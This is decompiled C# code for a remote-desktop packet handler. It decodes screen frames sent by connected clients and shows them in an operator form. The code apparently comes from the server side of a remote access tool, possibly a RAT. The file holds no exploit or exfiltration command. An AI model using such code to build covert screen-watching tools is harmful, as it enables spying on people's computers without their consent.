using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using Server.Connection;
using Server.Forms;
using Server.Helper;
using Server.MessagePack;

namespace Server.Handle_Packet
{
	// Token: 0x02000088 RID: 136
	public class HandleRemoteDesktop
	{
		// Token: 0x0600043C RID: 1084 RVA: 0x0002863C File Offset: 0x0002683C
		public void Capture(Clients client, MsgPack unpack_msgpack)
		{
			try
			{
				FormRemoteDesktop formRemoteDesktop = (FormRemoteDesktop)Application.OpenForms["RemoteDesktop:" + unpack_msgpack.ForcePathObject("ID").AsString];
				try
				{
					if (formRemoteDesktop != null)
					{
						if (formRemoteDesktop.Client == null)
						{
							formRemoteDesktop.Client = client;
							formRemoteDesktop.labelWait.Visible = false;
							formRemoteDesktop.timer1.Start();
							byte[] asBytes = unpack_msgpack.ForcePathObject("Stream").GetAsBytes();
							Bitmap bitmap = formRemoteDesktop.decoder.DecodeData(new MemoryStream(asBytes));
							formRemoteDesktop.rdSize = bitmap.Size;
							int num = Convert.ToInt32(unpack_msgpack.ForcePathObject("Screens").GetAsInteger());
							formRemoteDesktop.numericUpDown2.Maximum = num - 1;
						}
						byte[] asBytes2 = unpack_msgpack.ForcePathObject("Stream").GetAsBytes();
						object syncPicbox = formRemoteDesktop.syncPicbox;
						lock (syncPicbox)
						{
							using (MemoryStream memoryStream = new MemoryStream(asBytes2))
							{
								formRemoteDesktop.GetImage = formRemoteDesktop.decoder.DecodeData(memoryStream);
							}
							formRemoteDesktop.pictureBox1.Image = formRemoteDesktop.GetImage;
							formRemoteDesktop.FPS++;
							if (formRemoteDesktop.sw.ElapsedMilliseconds >= 1000L)
							{
								Control control = formRemoteDesktop;
								string[] array = new string[10];
								array[0] = "RemoteDesktop:";
								array[1] = client.ID;
								array[2] = "    FPS:";
								int num2 = 3;
								int fps = formRemoteDesktop.FPS;
								array[num2] = fps.ToString();
								array[4] = "    Screen:";
								array[5] = formRemoteDesktop.GetImage.Width.ToString();
								array[6] = " x ";
								array[7] = formRemoteDesktop.GetImage.Height.ToString();
								array[8] = "    Size:";
								array[9] = Methods.BytesToString((long)asBytes2.Length);
								control.Text = string.Concat(array);
								formRemoteDesktop.FPS = 0;
								formRemoteDesktop.sw = Stopwatch.StartNew();
							}
							goto IL_1F1;
						}
						goto IL_1E9;
						IL_1F1:
						goto IL_1F6;
					}
					IL_1E9:
					client.Disconnected();
				}
				catch (Exception)
				{
				}
				IL_1F6:;
			}
			catch
			{
			}
		}
	}
}
